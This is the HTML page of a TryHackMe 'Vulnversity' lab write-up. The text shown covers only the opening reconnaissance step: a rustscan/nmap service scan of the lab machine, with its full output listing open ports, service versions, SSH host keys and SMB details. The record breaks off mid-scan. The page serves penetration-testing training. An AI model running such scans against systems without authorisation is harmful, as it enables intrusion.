@@ -1,0 +1,463 @@
+<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+Learn about active recon, web app attacks and privilege escalation.
+
+https://tryhackme.com/r/room/vulnversity"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/posts/Vulnversity/"><meta property="og:site_name" content="乃 | Notes"><meta property="og:title" content="Vulnversity"><meta property="og:description" content=" Learn about active recon, web app attacks and privilege escalation.
+https://tryhackme.com/r/room/vulnversity"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><meta property="article:tag" content="Code Injection"><meta property="article:tag" content="Privilege Escalation"><title>Vulnversity | 乃 | Notes</title>
+<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.ico><link rel=canonical href=http://localhost:1313/posts/Vulnversity/><link rel=stylesheet href=/book.min.1cb8fa0a0b69f7b13085ac0158ef47b2e16eaf08c48bd640daf57ef7022cbce0.css integrity="sha256-HLj6Cgtp97EwhawBWO9HsuFurwjEi9ZA2vV+9wIsvOA=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.b025dc4e16799c97a76d20c6d68c677f7e4044c73fcd7bee618a11a8e8ae3ef8.js integrity="sha256-sCXcThZ5nJenbSDG1oxnf35ARMc/zXvuYYoRqOiuPvg=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>乃 | Notes</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle>
+<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Try Hack Me</a></label><ul><li><a href=/docs/TryHackMe/Vulnversity/>Vulnversity</a></li><li><a href=/docs/TryHackMe/Blue/>Blue</a></li><li><a href=/docs/TryHackMe/Kenobi/>Kenobi</a></li><li><a href=/docs/TryHackMe/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/TryHackMe/DailyBugle/>Daily Bugle</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
+</label><strong>Vulnversity</strong>
+<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></aside></header><article class="markdown book-post"><h1><a href=/posts/Vulnversity/>Vulnversity</a></h1><h5>May 23, 2023</h5><div><a href=/categories/TryHackMe/>TryHackMe</a></div><div><a href=/tags/Code-Injection/>Code Injection</a>,
+<a href=/tags/Privilege-Escalation/>Privilege Escalation</a></div><blockquote><p>Learn about active recon, web app attacks and privilege escalation.</p></blockquote><p><a href=https://tryhackme.com/r/room/vulnversity>https://tryhackme.com/r/room/vulnversity</a></p><h1 id=scanning>Scanning
+<a class=anchor href=#scanning>#</a></h1><p>Scan the machine for open ports using nmap.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> rustscan <span style=color:#f92672>-</span>a <span style=color:#ae81ff>10.10.118.9</span> <span style=color:#f92672>--</span> <span style=color:#f92672>-</span>sVC
+</span></span><span style=display:flex><span><span style=color:#f92672>.----.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.----..---.</span>  <span style=color:#f92672>.----.</span> <span style=color:#f92672>.---.</span>   <span style=color:#f92672>.--.</span>  <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> {}  }<span style=color:#f92672>|</span> { } <span style=color:#f92672>|</span>{ {__ {_   _}{ {__  <span style=color:#f92672>/</span>  ___} <span style=color:#f92672>/</span> {} \ <span style=color:#f92672>|</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>|</span> <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#f92672>.-.</span> \<span style=color:#f92672>|</span> {_} <span style=color:#f92672>|.-.</span>_} } <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>.-.</span>_} }\     }<span style=color:#f92672>/</span>  <span style=color:#f92672>/</span>\  \<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>\  <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39; `-&#39;</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-----</span><span style=color:#e6db74>&#39;`----&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;  `----&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>---</span><span style=color:#e6db74>&#39; `-&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;`-&#39;</span> <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>The Modern Day Port Scanner<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>________________________________________
+</span></span><span style=display:flex><span>: http:<span style=color:#f92672>//</span>discord<span style=color:#f92672>.</span>skerritt<span style=color:#f92672>.</span>blog           :
+</span></span><span style=display:flex><span>: https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>RustScan<span style=color:#f92672>/</span>RustScan :
+</span></span><span style=display:flex><span> <span style=color:#f92672>--------------------------------------</span>
+</span></span><span style=display:flex><span>Please contribute more quotes to our GitHub https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>rustscan<span style=color:#f92672>/</span>rustscan
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] The config file <span style=color:#f92672>is</span> expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
+</span></span><span style=display:flex><span>[<span style=color:#960050;background-color:#1e0010>!</span>] File limit <span style=color:#f92672>is</span> lower than default batch size<span style=color:#f92672>.</span> Consider upping <span style=color:#66d9ef>with</span> <span style=color:#f92672>--</span>ulimit<span style=color:#f92672>.</span> May cause harm to sensitive servers
+</span></span><span style=display:flex><span>[<span style=color:#960050;background-color:#1e0010>!</span>] Your file limit <span style=color:#f92672>is</span> very small, which negatively impacts RustScan<span style=color:#e6db74>&#39;s speed. Use the Docker image, or up the Ulimit with &#39;</span><span style=color:#f92672>--</span>ulimit <span style=color:#ae81ff>5000</span><span style=color:#e6db74>&#39;. </span>
+</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>21</span>
+</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>22</span>
+</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>139</span>
+</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>445</span>
+</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3128</span>
+</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.118.9</span>:<span style=color:#ae81ff>3333</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] Starting Script(s)
+</span></span><span style=display:flex><span>[<span style=color:#f92672>&gt;</span>] Running script <span style=color:#e6db74>&#34;nmap -vvv -p {{port}} {{ip}} -sVC&#34;</span> on ip <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Depending on the complexity of the script, results may take some time to appear<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] Starting Nmap <span style=color:#ae81ff>7.93</span> ( https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org ) at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span> <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span> EDT
+</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>NSE: Script Pre<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>0.00</span>s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>0.00</span>s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>0.00</span>s elapsed
+</span></span><span style=display:flex><span>Initiating Ping Scan at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>
+</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>10.10.118.9</span> [<span style=color:#ae81ff>4</span> ports]
+</span></span><span style=display:flex><span>Completed Ping Scan at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>0.15</span>s elapsed (<span style=color:#ae81ff>1</span> total hosts)
+</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host<span style=color:#f92672>.</span> at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>
+</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host<span style=color:#f92672>.</span> at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>0.04</span>s elapsed
+</span></span><span style=display:flex><span>DNS resolution of <span style=color:#ae81ff>1</span> IPs took <span style=color:#ae81ff>0.04</span>s<span style=color:#f92672>.</span> Mode: Async [<span style=color:#75715e>#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>
+</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>10.10.118.9</span> [<span style=color:#ae81ff>6</span> ports]
+</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>21</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>3128</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Completed SYN Stealth Scan at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>0.16</span>s elapsed (<span style=color:#ae81ff>6</span> total ports)
+</span></span><span style=display:flex><span>Initiating Service scan at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>
+</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>6</span> services on <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Completed Service scan at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>21.88</span>s elapsed (<span style=color:#ae81ff>6</span> services on <span style=color:#ae81ff>1</span> host)
+</span></span><span style=display:flex><span>NSE: Script scanning <span style=color:#ae81ff>10.10.118.9</span><span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>4.91</span>s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>0.85</span>s elapsed
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>0.00</span>s elapsed
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10.118.9</span>
+</span></span><span style=display:flex><span>Host <span style=color:#f92672>is</span> up, received echo<span style=color:#f92672>-</span>reply ttl <span style=color:#ae81ff>61</span> (<span style=color:#ae81ff>0.12</span>s latency)<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Scanned at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span> <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>31</span>:<span style=color:#ae81ff>47</span> EDT <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>28</span>s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE     REASON         VERSION
+</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span><span style=color:#f92672>/</span>tcp   open  ftp         syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> vsftpd <span style=color:#ae81ff>3.0.3</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>tcp   open  ssh         syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> OpenSSH <span style=color:#ae81ff>7.2</span>p2 Ubuntu <span style=color:#ae81ff>4</span>ubuntu2<span style=color:#ae81ff>.7</span> (Ubuntu Linux; protocol <span style=color:#ae81ff>2.0</span>)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ssh<span style=color:#f92672>-</span>hostkey: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>2048</span> <span style=color:#ae81ff>5</span>a4ffcb8c8761cb5851cacb286411c5a (RSA)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ssh<span style=color:#f92672>-</span>rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x<span style=color:#f92672>/</span>rdK8uuSM<span style=color:#f92672>/</span>fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN<span style=color:#f92672>+</span>KdwAYYDmnxSPVwkj2yXT9hJ<span style=color:#f92672>/</span>fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5<span style=color:#f92672>/</span>F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1<span style=color:#f92672>/</span>XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f<span style=color:#f92672>+</span>xDYUP7iNA0raxi2H<span style=color:#f92672>++</span>XQjktPqjKGQzJHemtPY5bn                                                                                                                                                                                   
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>256</span> ac9dec44610c28850088e968e9d0cb3d (ECDSA)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ecdsa<span style=color:#f92672>-</span>sha2<span style=color:#f92672>-</span>nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4<span style=color:#f92672>/</span><span style=color:#ae81ff>6</span>Db2TJNwcUNNFjYQRd5EhxNnP<span style=color:#f92672>+</span>oLvOTofBlF<span style=color:#f92672>/</span>n0ms6SwE<span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>256</span> <span style=color:#ae81ff>3050</span>cb705a865722cb52d93634dca558 (ED25519)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_ssh<span style=color:#f92672>-</span>ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL<span style=color:#f92672>/</span>Ybk<span style=color:#f92672>+</span><span style=color:#ae81ff>5</span>mAsT<span style=color:#f92672>/</span><span style=color:#ae81ff>81</span>axilYUUvUB
+</span></span><span style=display:flex><span><span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp  open  netbios<span style=color:#f92672>-</span>ssn syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> Samba smbd <span style=color:#ae81ff>3.</span>X <span style=color:#f92672>-</span> <span style=color:#ae81ff>4.</span>X (workgroup: WORKGROUP)
+</span></span><span style=display:flex><span><span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp  open  netbios<span style=color:#f92672>-</span>ssn syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> Samba smbd <span style=color:#ae81ff>4.3.11</span><span style=color:#f92672>-</span>Ubuntu (workgroup: WORKGROUP)
+</span></span><span style=display:flex><span><span style=color:#ae81ff>3128</span><span style=color:#f92672>/</span>tcp open  http<span style=color:#f92672>-</span>proxy  syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> Squid http proxy <span style=color:#ae81ff>3.5.12</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: squid<span style=color:#f92672>/</span><span style=color:#ae81ff>3.5.12</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: ERROR: The requested URL could <span style=color:#f92672>not</span> be retrieved
+</span></span><span style=display:flex><span><span style=color:#ae81ff>3333</span><span style=color:#f92672>/</span>tcp open  http        syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> Apache httpd <span style=color:#ae81ff>2.4.18</span> ((Ubuntu))
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Vuln University
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4.18</span> (Ubuntu)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>methods: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style=display:flex><span>Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:<span style=color:#f92672>/</span>o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_clock<span style=color:#f92672>-</span>skew: mean: <span style=color:#ae81ff>1</span>h20m00s, deviation: <span style=color:#ae81ff>2</span>h18m34s, median: <span style=color:#ae81ff>0</span>s
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>os<span style=color:#f92672>-</span>discovery: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   OS: Windows <span style=color:#ae81ff>6.1</span> (Samba <span style=color:#ae81ff>4.3.11</span><span style=color:#f92672>-</span>Ubuntu)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Computer name: vulnuniversity
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   NetBIOS computer name: VULNUNIVERSITY\x00
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Domain name: \x00
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   FQDN: vulnuniversity
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  System time: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T03:<span style=color:#ae81ff>32</span>:<span style=color:#ae81ff>10</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>:<span style=color:#ae81ff>00</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>time: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   date: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T07:<span style=color:#ae81ff>32</span>:<span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  start_date: N<span style=color:#f92672>/</span>A
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> p2p<span style=color:#f92672>-</span>conficker: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Checking <span style=color:#66d9ef>for</span> Conficker<span style=color:#f92672>.</span>C <span style=color:#f92672>or</span> higher<span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>1</span> (port <span style=color:#ae81ff>11877</span><span style=color:#f92672>/</span>tcp): CLEAN (Couldn<span style=color:#e6db74>&#39;t connect)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>2</span> (port <span style=color:#ae81ff>64173</span><span style=color:#f92672>/</span>tcp): CLEAN (Couldn<span style=color:#e6db74>&#39;t connect)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>3</span> (port <span style=color:#ae81ff>15194</span><span style=color:#f92672>/</span>udp): CLEAN (Failed to receive data)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>4</span> (port <span style=color:#ae81ff>35923</span><span style=color:#f92672>/</span>udp): CLEAN (Failed to receive data)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>4</span> checks are positive: Host <span style=color:#f92672>is</span> CLEAN <span style=color:#f92672>or</span> ports are blocked
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <span style=color:#f92672>&lt;</span>unknown<span style=color:#f92672>&gt;</span>, NetBIOS MAC: <span style=color:#ae81ff>000000000000</span> (Xerox)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Names:
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   VULNUNIVERSITY<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>   Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   VULNUNIVERSITY<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>03</span><span style=color:#f92672>&gt;</span>   Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   VULNUNIVERSITY<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>20</span><span style=color:#f92672>&gt;</span>   Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   \x01\x02__MSBROWSE__\x02<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>01</span><span style=color:#f92672>&gt;</span>  Flags: <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>        Flags: <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>1</span>d<span style=color:#f92672>&gt;</span>        Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>1</span>e<span style=color:#f92672>&gt;</span>        Flags: <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Statistics:
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>0000000000000000000000000000000000</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>0000000000000000000000000000000000</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#ae81ff>0000000000000000000000000000</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>311</span>: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_    Message signing enabled but <span style=color:#f92672>not</span> required
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   account_used: guest
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   authentication_level: user
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   challenge_response: supported
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  message_signing: disabled (dangerous, but default)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>NSE: Script Post<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
